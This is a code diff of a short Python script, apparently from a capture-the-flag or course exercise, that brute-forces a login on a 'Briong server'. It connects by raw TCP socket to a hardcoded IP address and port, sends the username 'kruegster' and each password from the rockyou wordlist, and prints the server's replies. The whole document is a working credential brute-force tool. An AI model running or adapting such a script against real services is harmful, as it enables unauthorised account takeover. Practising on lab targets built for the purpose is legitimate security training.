@@ -25,13 +25,13 @@
 """
 
 import socket
-from threading import Thread
+
 host = "142.93.117.193" # IP address here
 port = 1337  # Port here
 wordlist = "/usr/share/wordlists/rockyou.txt" # Point to wordlist file
 
 
-def brute_force(file, output, user):
+def brute_force():
     """
         Sockets: https://docs.python.org/2/library/socket.html
         How to use the socket s:
@@ -55,32 +55,24 @@ def brute_force(file, output, user):
             through each possible password and repeatedly attempt to login to
             the Briong server.
     """
-    username = user  # Hint: use OSINT
-    fw = open(output, "w+")
-    with open(file, "r") as f:
+    username = "kruegster\n"  # Hint: use OSINT
+
+    with open(wordlist, "r") as f:
         for l in f.readlines():
             password = l
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
             s.connect((host, port))
             s.recv(1024)
-            s.send(username)
+            s.send(username.encode())
             s.recv(1024)
-            s.send(password)
-            z = s.recv(1024).decode()
-            x = password + " : " + z
-            print(x)
-            fw.write(x)
-    fw.close()
-    f.close()
+            s.send(password.encode())
+            z = s.recv(1024).decode().rstrip() + " : " + l.rstrip()
+            print(z)
 
 
 def main():
-    filename = input("Filename ")
-    output = input("Output Filename ")
-    username = input("Username ")
-    brute_force(filename, output, username)
-
+    brute_force()
 
 
 if __name__ == '__main__':
